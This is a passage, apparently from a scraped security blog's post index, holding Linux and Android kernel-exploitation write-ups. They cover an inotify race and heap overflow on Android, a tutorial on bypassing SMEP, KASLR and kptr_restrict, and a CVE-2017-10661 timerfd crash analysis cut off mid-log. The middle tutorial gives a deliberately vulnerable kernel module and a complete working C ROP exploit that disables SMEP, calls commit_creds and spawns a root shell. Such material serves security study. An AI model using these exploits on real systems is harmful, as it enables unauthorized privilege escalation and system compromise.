内存布局现在的问题是如何把iovec结构体数组布局到受害对象event结构体后面？我们需要想办法对堆内存进行布局，促使溢出结构体后面是我们可控的数据（iovec结构体数组），这样在触发堆溢出的时候才能完成对iovec-&gt;iov_base值的非正常修改。为了更容易让堆布局到我们理想的状态，我们可以先使用event对象把内核中slab空洞填满，然后内核会分配新的slab内存块，接着申请大量的iovec数组，然后间隔释放iovec数组同时再次创建event对象去填充间隔释放的iovec数组与触发堆溢出漏洞。12345Event object / Payload / Victim objectEvent object （监听事件对象）Payload == 喷射数据(也就是strcpy操作的数据，Event对象中的name指向)Victim object （pipe受害对象） 理想的内存布局 竞争条件 -&gt; 释放后重引用 -&gt; 堆溢出 构造溢出数据这里需要注意网上公布的poc是基于短文件名的，但是android默认好像已经没有使用kmalloc-64了，在kmalloc时最少都会使用kmalloc-128，这样就导致文件名太短无法溢出到下一个slab，所以在android上运行poc每次都只是检测到了溢出但是并没有导致设备崩溃，下面是通过构造长文件名来触发溢出kmalloc-256。123inotify_event_info结构体大小为0x2c，也就是说最起码都有0x2c大小(gdb) p &amp;((struct inotify_event_info*)0)-&gt;name$1 = (char (*)[]) 0x2c &lt;-- 44 1234567264 - 256 = 8 需要溢出8个字节事件结构体: 44 + 200 = 244264 - 244 = 20(喷射字符串必须比实际字符串多20)喷射结构体：44 + 200 + 20 = 264实际拷贝字符串长度：200 + 20 = 220 (拷贝的长度)喷射构造:16 + 220 = 236(实际喷射字节 16的UAF结构体头部,220的实际字符串拷贝)16 + 220 = 16 + 212 + 8 = 头部(16) + 填充值(212) + 写入地址(8) 构造好了一个任意地址读写，那么提权就只是套路了。 思考短文件名如果内核支持kmalloc-64的话短文件名其实也可以利用，比如HUAWEI Mate9，可以通过spray ipv6_mc_socklist，触发堆溢出对rcu进行覆盖，通过rcu回调来控制内核执行流程，只是猜想并没有验证，以后有时间再看看。123456789struct ipv6_mc_socklist &#123; struct in6_addr addr; int ifindex; struct ipv6_mc_socklist __rcu *next; /* &lt;&lt;&lt;&lt;&lt;&lt;&lt; Overflow &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; */ rwlock_t sflock; unsigned int sfmode; /* MCAST_&#123;INCLUDE,EXCLUDE&#125; */ struct ip6_sf_socklist *sflist; struct rcu_head rcu;&#125;; 权限提升现在我们实现了任意地址写任意值，那么如何进行权限提升呢？ 通过漏洞把ptmx-&gt;check_flags改为work_for_cpu_fn 通过fcntl函数触发work_for_cpu_fn，间接调用register_sysctl_table函数注册新sysctl 通过read触发新sysctl的处理函数，间接调用kernel_sock_ioctl函数修改limit 通过pipe对内核进行任意读写，patch关键结构体 减少硬编码的方式在kernel\\sysctl.c这个文件中存在对kptr_restrict的sysctl结构体进行初始化操作，我们可以通过内存遍历获取到kptr_restrict符号的地址，然后修改为0，这样就关闭了kptr_restrict保护机制用来过滤一些地址，以此避免将内核地址泄漏给攻击者，通过配置kptr_restrict的值来控制是否开启: 0:完全禁止 1:使用”%pk”打印的内核指针被隐藏(以0替换)，除非用户存在CAP_SYSLOG权限。 2:所有内核使用”%pk”打印的都被隐藏 123456789&#123; .procname = \"kptr_restrict\", .data = &amp;kptr_restrict, .maxlen = sizeof(int), .mode = 0644, .proc_handler = proc_dointvec_minmax_sysadmin, .extra1 = &amp;zero, .extra2 = &amp;two,&#125;, 123456789.text:FFFFFFC001237700 aKptrRestrict DCB \"kptr_restrict\",0.text:FFFFFFC00156D0C8 DCQ 0xFFFFFFC001237700.text:FFFFFFC00156D0D0 DCQ 0xFFFFFFC001760B78.text:FFFFFFC00156D0D8 DCQ 0x1A400000004.text:FFFFFFC00156D0E0 DCQ 0marlin:/data/local/tmp $ cat /proc/kallsyms |grep kptr_restrictffffffc001760b78 B kptr_restrict exploit编写流程6.0~7.0 -&gt; root方案利用步骤 步骤0：准备资源并填充缓冲区 步骤1：产生读取线程并使用iovec对象对堆进行布局 步骤2：产生竞争线程 第3步：赢得比赛，触发溢出实现任意地址写任意值 fcntl（ptmx_fd，F_SETFL，0x40002000）== 0x40002000 第4步：覆盖uid，禁用SELinux并产生ROOT外壳 修补方案总结最开始分析的时候被网上公布的poc坑了,一直以为只是简单的堆溢出漏洞,后来才发现还存在一个UAF漏洞。一般的条件竞争漏洞修补是都会进行加锁，所以分析下加锁的用意可能会对理解漏洞成因有所帮助。又学习了一种新的利用方法通过布局iovec实现任意读写的方式。 参考https://www.ibm.com/developerworks/cn/linux/l-inotifynew/https://www.anquanke.com/post/id/129468The-Art-of-Exploiting-Unconventional-Use-after-free-Bugs-in-Android-Kernelasia-18-WANG-KSMA-Breaking-Android-kernel-isolation-and-Rooting-with-ARM-MMU-features","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"Linux Kernel x86-64 bypass SMEP-KASLR-kptr_restric","slug":"Linux Kernel x86-64 bypass SMEP-KASLR-kptr_restric","date":"2018-03-11T16:05:36.000Z","updated":"2018-08-26T10:39:25.728Z","comments":true,"path":"2018/03/12/Linux Kernel x86-64 bypass SMEP-KASLR-kptr_restric/","link":"","permalink":"http://github.com/2018/03/12/Linux Kernel x86-64 bypass SMEP-KASLR-kptr_restric/","excerpt":"","text":"Linux Kernel x86-64 bypass SMEP-KASLR-kptr_restric Background(背景)Before to get into a genuine exploitation of a kernel vulnerable module，let’s see which protections we need to bypass在深入了解内核易受攻击的某块之前，我们来看看需要绕过哪些保护机制 SMEP（管理模式执行保护）SMEP stands for Supervisor Mode Execution ProtectionSMEP代表管理模式执行保护This kernel protection doesn’t allow a user space code to be executed by the kernel.内核保护不允许内核执行用户态空间代码，To check if SMEP is activated，we can simply read /porc/cpuinfo要检查SMEP是否被激活，可以简单的阅读/proc/cpuinfo1234# cat /proc/cpuinfo | grep smep......flags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts mmx fxsr sse sse2 ss ht syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon pebs bts nopl xtopology tsc_reliable nonstop_tsc aperfmperf eagerfpu pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch epb fsgsbase tsc_adjust bmi1 hle avx2 smep bmi2 invpcid rtm rdseed adx smap xsaveopt xsavec xgetbv1 dtherm ida arat pln pts hwp hwp_notify hwp_act_window hwp_epp..... SMEP is the 20th bit of the CR4 registerSMEP是CR4寄存器中的第20位： KASLR(内核地址空间随机布局)KASLR stands for Kernel Address Space Layout Randomization.KASLR代表内核地址空间随机化布局It aims to make some kernel exploits more difficult to implement by randomizing the base address value of the kernel（boot time）它指通过随机化内核的基地址值来使一些内核漏洞更难利用（开机时间）Exploits that rely on the locations of internal symbols must discover the randomized base address依靠内部内核符号位置的漏洞必须发现随机化的基地址 Kernel Address Display Restriction（内核地址显示限制）kptr_restrict indicates if restrictions are placed on exposing kernel addresses via/proc and other interfaceskptr_restrict指示是否限制通过/proc和其他接口公开内核地址 the default,there are no restrictions.（默认情况下,没有任何限制） kernel pointers printed using the %pK format speciffier will be replaced with o’s unless the user has CAP_SYSLOG.（除非用户具有CAP_SYSLOG功能，否则使用%pK格式说明符打印的指针将会被替换为0） kernel pointers printed using %pK will be replaced with o’s regardless of privileges.（无论权限如何，使用%pK打印的内核指针将被替换为0）In other words，we can’t get commit_creds addr just by reading the /proc/kallsyms:换句话说，我们不能通过阅读/proc/kallsyms来获取commit_creds addr:12# cat /proc/kallsyms | grep commit_creds0000000000000000 T commit_creds Privilege escalation（特权升级）As always，our goal is to get the top privilege and for that，we just need to execute the following与往常一样，我们的目标是获取最高权限，为此只想执行以下操作1commit_creds(prepare_kernel_cred(0)) Get back to user land（返回用户位置）Even if we can bypass SMEP，we can’t just try to execute /bin/sh in our user code.We need to go back to user land correctly即使我们可以绕过SMEP，我们也不能试图在我们的用户代码中执行/bin/sh。我们需要正确地返回到用户位置 This can be done with two gadgets：这可以使用两个gadget完成12swapgsiretq Followed by this structure：（紧随其后的是这种结构）12345the next RIPuser land CSuser land EFLAGSuser land RSPuser land SS Exploitation测试代码：https://github.com/black-bunny/LinKern-x86_64-bypass-SMEP-KASLR-kptr_restric Vulnerable module1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#include &lt;linux/module.h&gt;#include &lt;linux/version.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/types.h&gt;#include &lt;linux/kdev_t.h&gt;#include &lt;linux/fs.h&gt;#include &lt;linux/device.h&gt;#include &lt;linux/cdev.h&gt;#include &lt;asm/uaccess.h&gt;#include &lt;linux/slab.h&gt;static dev_t first; // Global variable for the first device number static struct cdev c_dev; // Global variable for the character device structure static struct class *cl; // Global variable for the device class static char *buffer_var;static int vuln_open(struct inode *i, struct file *f)&#123; printk(KERN_INFO \"[i] Module vuln: open()\\n\"); return 0;&#125;static int vuln_close(struct inode *i, struct file *f)&#123; printk(KERN_INFO \"[i] Module vuln: close()\\n\"); return 0;&#125;static ssize_t vuln_read(struct file *f, char __user *buf, size_t len, loff_t *off)&#123; if (strlen(buffer_var) &gt; 0) &#123; printk(KERN_INFO \"[i] Module vuln read: %s\\n\", buffer_var); kfree(buffer_var); buffer_var = kmalloc(100, GFP_DMA); return 0; &#125; else &#123; return 1; &#125;&#125;static ssize_t vuln_write(struct file *f, const char __user *buf, size_t len, loff_t *off)&#123; char buffer[100] = &#123; 0 &#125;; if (_copy_from_user(buffer, buf, len)) return -EFAULT; buffer[len - 1] = '\\0'; printk(\"[i] Module vuln write: %s\\n\", buffer); strncpy(buffer_var, buffer, len); return len;&#125;static struct file_operations pugs_fops =&#123; .owner = THIS_MODULE, .open = vuln_open, .release = vuln_close, .write = vuln_write, .read = vuln_read&#125;;static int __init vuln_init(void) /* Constructor */&#123; buffer_var = kmalloc(100, GFP_DMA); printk(KERN_INFO \"[i] Module vuln registered\"); if (alloc_chrdev_region(&amp;first, 0, 1, \"vuln\") &lt; 0) &#123; return -1; &#125; if ((cl = class_create(THIS_MODULE, \"chardrv\")) == NULL) &#123; unregister_chrdev_region(first, 1); return -1; &#125; if (device_create(cl, NULL, first, NULL, \"vuln\") == NULL) &#123; printk(KERN_INFO \"[i] Module vuln error\"); class_destroy(cl); unregister_chrdev_region(first, 1); return -1; &#125; cdev_init(&amp;c_dev, &amp;pugs_fops); if (cdev_add(&amp;c_dev, first, 1) == -1) &#123; device_destroy(cl, first); class_destroy(cl); unregister_chrdev_region(first, 1); return -1; &#125; printk(KERN_INFO \"[i] &lt;Major, Minor&gt;: &lt;%d, %d&gt;\\n\", MAJOR(first), MINOR(first)); return 0;&#125;static void __exit vuln_exit(void) /* Destructor */&#123; unregister_chrdev_region(first, 3); printk(KERN_INFO \"Module vuln unregistered\");&#125;module_init(vuln_init);module_exit(vuln_exit);MODULE_LICENSE(\"GPL\");MODULE_AUTHOR(\"blackndoor\");MODULE_DESCRIPTION(\"Module vuln overflow\"); This really simple kernel module has a stack overflow in its function vuln_write( ) The datas’s lenght copied to the buffer variable isn’t checked这个非常简单的内核模块在其函数vuln_write中存在栈溢出，未检查复制到缓冲区变量的数据长度 Analyse123456789101112131415161718192021222324252627~$ lsmodkmod 16384 0 - Live 0x0000000000000000 (O) &lt;= kptr_restrict~$ ls / devconsole null ttyS0 vuln~$ cat / proc / kallsyms | grep commit_creds0000000000000000 T commit_creds &lt;= kptr_restrict~$ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB &gt; / dev / vuln[28.965579] general protection fault : 0000[#1] SMP[28.967297] Modules linked in : kmod(O)[28.968139] CPU : 0 PID : 109 Comm : sh Tainted : G O 4.8.0 #5[28.968139] Hardware name : QEMU Standard PC(i440FX + PIIX, 1996), BIOS Ubuntu - 1.8.2 - 1ubuntu1 04 / 01 / 2014[28.968139] task : ffff9f1fc2730000 task.stack : ffff9f1fc2770000[28.968139] RIP : 0010 : [&lt; 4242424242424242&gt;] [&lt; 4242424242424242&gt;] 0x4242424242424242...[28.968139] CR2 : 0000000000494b0a CR3 : 000000000272f000 CR4 : 00000000001006f0 &lt;= SMEP...[28.968139] Call Trace :[28.968139] [&lt; ffffffffbb0c2a00&gt;] ? __init_waitqueue_head + 0x10 / 0x20...(restarted)~$ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB &gt; / dev / vuln[112.990843] general protection fault : 0000[#1] SMP...[112.992198] Call Trace :[112.992198] [&lt; ffffffffba0c2a00&gt;] ? __init_waitqueue_head + 0x10 / 0x20 &lt;= KASLR In this analyse，we clearly see the protections（SMEP，KASLR and kptr_restrict）在这个分析中，我们清晰看到 Bypass SMEPAs explained before, SMEP doens’t allow the user space code to be executed by the kernel,so even if we control RIP，we can’t execute the user code right away：we can use a ROP explooit with kernel space addresses only or we can disable the SMEP’ bit如前所述，SMEP不允许内核执行用户空间代码，所以即使我们控制RIP也是如此，我们不能立即执行用户代码：我们只能使用带有内核空间地址的ROP攻击，或者可以禁用SMEP位SMEP is the 20th bit of the CR4 register which in our case is equal to：00000000000006f0SMEP是CR4寄存器的第20位，我们这里的情况等于 CR4：00000000001006f0 If we can get CR4 to be equal to：CR4：00000000000006f0 如果我们可以得到CR4等于：CR4：00000000000006f0 SMEP will be disabled.（SMEP将被禁用）To do so，we can use two gadgets：为此，我们可以使用两个gadgets12POP RDI；RET //place 00000000000006f0 in RDIMOV CR4，RDI；RET // SMEP disabled! Bypass KASLR and kptr_restrictThe goal of these bypasses is to find a kernel space address,and add to it an offset to retrieve the gadgets/address needed.We found one usefull address in the result of the dmesg command:这些绕过的目标是找到一个内核空间地址，并添加一个偏移量来检索所需要的gadgets/address。我们在dmesg命令的结果中找到了一个有用的地址：1234567891011121314~$ dmesg[0.000000] Linux version 4.8.0 (root@pc1001) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0 - 6ubuntu1~16.04.2)) #5 SMP Sat Oct 8 10:01 : 18 CEST 2016[0.000000] Command line : console = ttyS0 loglevel = 3 oops = panic panic = 1[0.000000] KERNEL supported cpus :[0.000000] Intel GenuineIntel[0.000000] AMD AuthenticAMD[0.000000] Centaur CentaurHauls[0.000000] x86 / fpu : Legacy x87 FPU detected.[0.000000] x86 / fpu : Using 'eager' FPU context switches.[0.000000] e820 : BIOS - provided physical RAM map :[0.000000] BIOS - e820 : [mem 0x0000000000000000 - 0x000000000009fbff] usable...[0.221392] Freeing SMP alternatives memory : 24K(ffffffffafea9000 - ffffffffafeaf000)... This is good but we still need to find offsets that we will add or substract to the address we found in order to get gadgets(for instance”pop gadget” or commit_creds address).这很好，但我们仍然需要找到offset 我们将添加或减去我们找到的地址以获取gadgets（例如”pop gadget”或commit_creds address）。We need to find the same kernel as the one used in the exercice with KASLR OFF and kptr_restrict set to 0，to be able to find our offsets.我们需要找到一些内核，如和练习中KASLR OFF和kptr_restrict设置为0一样的那种，以便我们能够找到偏移量 For this purpose，let’s first see the kernel used by the system：为此，我们先看看系统使用的内核12~$ uname - aLinux(none) 4.8.0 #5 SMP Sat Oct 8 10:01 : 18 CEST 2016 x86_ 64 GNU/Linux We download the kernel 4.8.0 from kernel.org and compile it with KASLR OFF.我们从kernel.org下载内核4.8.0并使用KASLR OFF进行编译。Then，we disable kptr_restric which is set in the “init” file. To do so we extract the file’s structure from initramfs.img然后 我们禁用在’init’文件中设置的kptr_restric。为此，我们从initramfs.img中提取文件的结构gzip -dcS .img initramfs.img | cpio -id We comment the 13th line:我们注意第13行1234567891011121314151617#!/bin/shchown root:root /root chown root:root /root/* chmod 600 /root/flag mknod -m 0666 /dev/null c 1 3 mknod -m 0660 /dev/ttyS0 c 4 64mount -t proc proc /proc mount -t sysfs sysfs /sys# restriction kallsymsecho 1 &gt; /proc/sys/kernel/kptr_restrict &lt;= comment this line insmod /kmod.ko mknod /dev/vuln c 247 0 chmod a+rw /dev/vulnsetsid cttyhack setuidgid 1000 shumount /proc umount /syspoweroff -f and we recreate the file’s structure：我们重新创建文件的结构：1find . | cpio -H newc -o | gzip &gt; ../initramfs.img We can now extract gadgets with ROPgadget:我们现在可以使用ROPgadget提取gadget：1234~$ ROPgadget --binary bzImage_KASLROFF | grep \"pop rdi ; ret\"...0xffffffff810b33bd : pop rdi; ret... With the same kernel，we collect usefull addresses such as：使用相同的内核，我们收集有用的地址 如：12commit_creds：ffffffff810a1cf0prepare_kernel_cred：ffffffff810a2060 The offset for the gadget “pop rdi” isgadget(pop rdi)的偏移量为：1\"pop RDI ret\" - prepare_kernel_creds = 0x1135d The offset was found with the kernel KASLR OFF，let’s see if the offset is different with the kernel KASLR ON：在内核KASLR OFF中找到偏移量，让我们看看偏移量是否与内核KASLR ON不同：1234567891011~$ cat /proc/kallsyms | grep prepare_kernel_credffffffffb90a21c0 T prepare_kernel_cred...~$ cat /proc/kallsyms | grep commit_credsffffffffb90a1e50 T commit_creds...(in another terminal)...(gdb)x / 2i ffffffffb90a21c0 + 0x1135d0xffffffffb90b351d: pop rdi0xffffffffb90b351e : ret We can do the same to retrieve other gadgets such as：（我们也可以做同样的检索其他gadget，如：）123movswapgsiretq Continuing with the kernel KASLR ON,we calculate the offset between the usefull address found in dmesg and prepare_kernel_cred/commit_creds:继续内核KASLR ON，我们计算在dmesg和prepare_kernel_cred/commit_creds中找到的有用地址之间的偏移量123456~$ dmesg...[0.208567] Freeing SMP alternatives memory : 24K(ffffffffb9ea9000 - ffffffffb9eaf000)... ffffffffb9ea9000 - ffffffffb90a1e50 = e071b0 =&gt; commit_creds_offset ffffffffb9ea9000 - ffffffffb90a21c0 = e06e40 =&gt; prepare_kernel_cred_offset We now have everythings to exploit，so we can set back the kptr_restric protection我们现在有许多东西可以利用，所以可以设置kptr_restric保护 ExploitThe Exploit is simple： （这个利用很简单） 1.execute dmesg （执行dmesg） 2.find the usefull address （找到有用的地址） 3.prepare the payload （准备有效载荷） 4.trigger the vulnerablity （触发漏洞） The payload has the following content：（有效载荷具有以下内容）1234567offset before RIPPOP RDI；RETMOV CR4，RDI；RETcommit_creds(prepare_kernel_cred(0))swapgsiretqsafe strucure Here is the final exploit:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;sys/mman.h&gt;#include &lt;assert.h&gt;struct cred;struct task_struct;typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));typedef int(*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));prepare_kernel_cred_t prepare_kernel_cred;commit_creds_t commit_creds;unsigned long user_cs;unsigned long user_ss;unsigned long user_rflags;unsigned long stack;/*this function is needed to backup userland envthese values are necessary just after the iretq calls*/static void save_state() &#123; asm( \"movq %%cs, %0\\n\" \"movq %%ss, %1\\n\" \"pushfq\\n\" \"popq %2\\n\" : \"=r\" (user_cs), \"=r\" (user_ss), \"=r\" (user_rflags) : : \"memory\");&#125;/* function to get root id */void getroot(void)&#123; commit_creds(prepare_kernel_cred(0));&#125;/*this function checks if we got the root id and pops a shell if we didthe memory address of the function is placed in the ROP*/void shell(void) &#123; printf(\"[+] getuid() ...\"); if (!getuid()) &#123; printf(\" [root]\\n[+] Enjoy your shell...\\n\"); system(\"/bin/sh\"); &#125; else &#123; printf(\"[+] not root\\n[+] failed !!!\\n\"); &#125;&#125;/*This function tries to find the usefull addr needed for the expoit*/unsigned long findAddr() &#123; char line[512]; char string[] = \"Freeing SMP alternatives memory: 24K\"; char found[17]; unsigned long addr = 0; FILE* file = fopen(\"/tmp/dmesg\", \"r\"); while (fgets(line, sizeof(line), file)) &#123; if (strstr(line, string)) &#123; strncpy(found, line + 53, 16); sscanf(found, \"%p\", (void **)&amp;addr); break; &#125; &#125; fclose(file); if (addr == 0) &#123; printf(\" dmesg error...\\n\"); exit(1); &#125; return addr;&#125;int main(int argc, char *argv[])&#123; int fd; unsigned char payload[237] = &#123; 0 &#125;; unsigned char *p = payload; unsigned long memOffset; /* execute dmesg and place result in a file */ printf(\"[+] Excecute dmesg...\\n\"); system(\"dmesg &gt; /tmp/dmesg\"); /* find: Freeing SMP alternatives memory */ printf(\"[+] Find usefull addr...\\n\"); memOffset = findAddr(); printf(\" addr[0x%llx]\\n\", memOffset); /* set value for commit_creds and prepare_kernel_cred */ commit_creds = (commit_creds_t)(memOffset - 0xe071b0); prepare_kernel_cred = (prepare_kernel_cred_t)(memOffset - 0xe06e40); /* open fd on /dev/vuln */ printf(\"[+] Open vuln device...\\n\"); if ((fd = open(\"/dev/vuln\", O_RDWR)) &lt; 0) &#123; printf(\" Can't open device file: /dev/vuln\\n\"); exit(1); &#125; /* payload */ printf(\"[+] Construct the payload...\\n\"); save_state(); /* offset before RIP */ memcpy(p, \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\", 116); p += 116; /* pop rdi ; ret */ unsigned long poprdi = (unsigned long)prepare_kernel_cred + 0x1135d; memcpy(p, &amp;poprdi, 8); printf(\" pop RDI at 0x%lx\\n\", poprdi); p += 8; memcpy(p, \"\\xf0\\x06\\x00\\x00\\x00\\x00\\x00\\x00\", 8); /* SMEP OFF */ p += 8; /* mov cr4, rdi ; pop rbp ; ret */ unsigned long movcr4 = (unsigned long)prepare_kernel_cred - 0x86880; memcpy(p, &amp;movcr4, 8); printf(\" mov CR4, RDI at 0x%lx\\n\", movcr4); p += 8; memcpy(p, \"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\", 8); /* for rbp */ p += 8; /* getroot */ unsigned long gr = (unsigned long)getroot; memcpy(p, &amp;gr, 8); p += 8; /* swapgs; pop rbp; ret */ unsigned long swapgs = (unsigned long)prepare_kernel_cred - 0x3dfbc; printf(\" swapgs at 0x%lx\\n\", swapgs); memcpy(p, &amp;swapgs, 8); p += 8; memcpy(p, \"\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\", 8); /* for rbp */ p += 8; /* iretq */ unsigned long iretq = (unsigned long)prepare_kernel_cred - 0x61066; printf(\" iretq at 0x%lx\\n\", iretq); memcpy(p, &amp;iretq, 8); p += 8; /* the stack should look like this after an iretq call RIP CS EFLAGS RSP SS */ /* shell */ unsigned long sh = (unsigned long)shell; memcpy(p, &amp;sh, 8); p += 8; /* user_cs */ memcpy(p, &amp;user_cs, 8); p += 8; /* user_rflags */ memcpy(p, &amp;user_rflags, 8); p += 8; /* stack of userspace */ register unsigned long rsp asm(\"rsp\"); unsigned long sp = (unsigned long)rsp; memcpy(p, &amp;sp, 8); p += 8; /* user_ss */ memcpy(p, &amp;user_ss, 8); /* trig the vuln */ printf(\"[+] Trig the vulnerablity...\\n\"); write(fd, payload, 221); return 0;&#125; Can I get root please:12345678910111213141516171819202122~$ whoamiblackbunny~$ cat /proc/kallsyms | grep commit_creds0000000000000000 T commit_creds0000000000000000 R __ksymtab_commit_creds0000000000000000 r __kcrctab_commit_creds0000000000000000 r __kstrtab_commit_creds~$ /tmp/exploit[+] Excecute dmesg...[+] Find usefull addr...addr[0xffffffffbeea9000][+] Open vuln device...[+] Construct the payload...pop RDI at 0xffffffffbe0b351dmov CR4, RDI at 0xffffffffbe01b940swapgs at 0xffffffffbe064204iretq at 0xffffffffbe04115a[+] Trig the vulnerablity...[+] getuid() ...[root][+] Enjoy your shell...~# whoamiroot 原文:http://blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Exploit","slug":"Exploit","permalink":"http://github.com/tags/Exploit/"}]},{"title":"CVE-2017-10661","slug":"CVE-2017-10661","date":"2017-12-29T05:06:09.000Z","updated":"2019-03-30T10:06:07.724Z","comments":true,"path":"2017/12/29/CVE-2017-10661/","link":"","permalink":"http://github.com/2017/12/29/CVE-2017-10661/","excerpt":"","text":"CVE-2018-10661 前言测试内核测试时使用的linux内核是MI 5C的内核(3.10.58-03548-gc670b5a) 漏洞描述在4.10.15之前的linux内核中fs/timerfd.c中存在条件竞争漏洞,允许本地用户通过使用不合适的might_cancel列表的文件描述符操作获取特权或导致拒绝服务(list corruption or use-after-free) Google修复链接https://android.googlesource.com/kernel/goldfish/+/95cb006041c2f53060f4decffc7ef27f60aa1d39 存在漏洞的Nexus内核版本Nexus 6P :Linux version 3.10.73-geac7d674 (android-build@wpef26.hot.corp.google.com) (gcc version 4.9.x-google 20140827 (prerelease) (GCC) ) #1 SMP PREEMPT Tue Dec 13 10:11:12 UTC 2016Nexus 5X :Linux version 3.10.73-gf97f123 (android-build@wpiu4.hot.corp.google.com) (gcc version 4.9.x-google 20140827 (prerelease) (GCC) ) #1 SMP PREEMPT Mon Nov 2 20:10:58 UTC 2015 漏洞复现红米4A_崩溃日志[ 259.810287] Unable to handle kernel paging request at virtual address dead000000000200 [ 259.810331] pgd = ffffffc06b967000 [ 259.810339] [dead000000000200] *pgd=00000000a1fb1003, *pud=00000000a1fb1003, *pmd=0000000000000000 [ 259.810360] Internal error: Oops: 96000044 [#1] PREEMPT SMP [ 259.810367] Modules linked in: wlan(O) [ 259.810386] CPU: 2 PID: 6022 Comm: main Tainted: G W O 3.18.24-perf-gdcca0a6 #1 [ 259.810394] Hardware name: Qualcomm Technologies, Inc. MSM8917-PMI8937 QRD SKU5 (DT) [ 259.810403] task: ffffffc053611900 ti: ffffffc035e48000 task.ti: ffffffc035e48000 [ 259.810418] PC is at do_timerfd_settime+0x124/0x384 [ 259.810427] LR is at do_timerfd_settime+0x118/0x384 [ 259.810435] pc : [&lt;ffffffc0001eb300&gt;] lr : [&lt;ffffffc0001eb2f4&gt;] pstate: 80000145 [ 259.810442] sp : ffffffc035e4bdd0 [ 259.810448] x29: ffffffc035e4bdd0 x28: ffffffc035e48000 [ 259.810461] x27: ffffffc035e4bea8 x26: 0000000000000056 [ 259.810474] x25: ffffffc0111f3300 x24: ffffffc0111f3301 [ 259.810486] x23: 0000000000000001 x22: ffffffc035e4be88 [ 259.810498] x21: 0000000000000000 x20: ffffffc0015ebb90 [ 259.810511] x19: ffffffc0111f3b00 x18: 0000000000000000 [ 259.810523] x17: 0000000000000001 x16: ffffffc0001ebb54 [ 259.810535] x15: 0000007f995ff838 x14: 000000002b63a2d4 [ 259.810547] x13: ffffffffa5cce430 x12: 0000000000000000 [ 259.810559] x11: 00000000041cdaeb x10: 00000000000f4240 [ 259.810571] x9 : 00000000000003e8 x8 : 0000000000000056 [ 259.810583] x7 : 0000000000000000 x6 : 0000010624dd2fb8 [ 259.810594] x5 : 0000000000000000 x4 : ffffffc035e4bda0 [ 259.810606] x3 : 0000000000000000 x2 : 0000000000000000 [ 259.810617] x1 : ffffffc0111f3be0 x0 : dead000000000200 ... [ 259.812135] [ 259.812143] Process main (pid: 6022, stack limit = 0xffffffc035e48058) [ 259.812149] Call trace: [ 259.812160] [&lt;ffffffc0001eb300&gt;] do_timerfd_settime+0x124/0x384 [ 259.812170] [&lt;ffffffc0001ebbe0&gt;] SyS_timerfd_settime+0x8c/0x108 [ 259.812181] Code: 9429cf30 f9407261 f9407660 f9000420 (f9000001) [ 259.812295] ---[ end trace 10b0993cfa7a40d0 ]--- [ 259.874037] Kernel panic - not syncing: Fatal exception [ 259.874050] CPU3: stopping MI 5C崩溃日志[ 72.679105] Unable to handle kernel paging request at virtual address 00200200 [ 72.679130] pgd = ffffffc03603a000 [ 72.679136] [00200200] *pgd=0000000054a8a003, *pmd=0000000000000000 [ 72.679152] Internal error: Oops: 96000046 [#1] PREEMPT SMP [ 72.679159] Modules linked in: [ 72.679172] CPU: 5 PID: 3907 Comm: main Not tainted 3.10.58-03548-gc670b5a #1 [ 72.679179] task: ffffffc006d18b00 ti: ffffffc030464000 task.ti: ffffffc030464000 [ 72.679198] PC is at do_timerfd_settime+0x13c/0x384 [ 72.679204] LR is at do_timerfd_settime+0x124/0x384 [ 72.679210] pc : [&lt;ffffffc0001fe99c&gt;] lr : [&lt;ffffffc0001fe984&gt;] pstate: 80000145 [ 72.679215] sp : ffffffc030467dc0 [ 72.679220] x29: ffffffc030467dc0 x28: ffffffc030464000 [ 72.679230] x27: ffffffc000e2e000 x26: ffffffc030467eb0 [ 72.679239] x25: 0000000000000001 x24: ffffffc04ab4c200 [ 72.679249] x23: 0000000000000000 x22: 0000000000000001 [ 72.679258] x21: ffffffc030467e90 x20: ffffffc0010fa350 [ 72.679268] x19: ffffffc04ab4d700 x18: 0000000000000000 [ 72.679277] x17: 0000000000000001 x16: ffffffc0001ff204 [ 72.679286] x15: 00000073aacff838 x14: 00000000322852a5 [ 72.679297] x13: ffffffffa5cce228 x12: 0000000000000000 [ 72.679306] x11: 000000002d2614c5 x10: 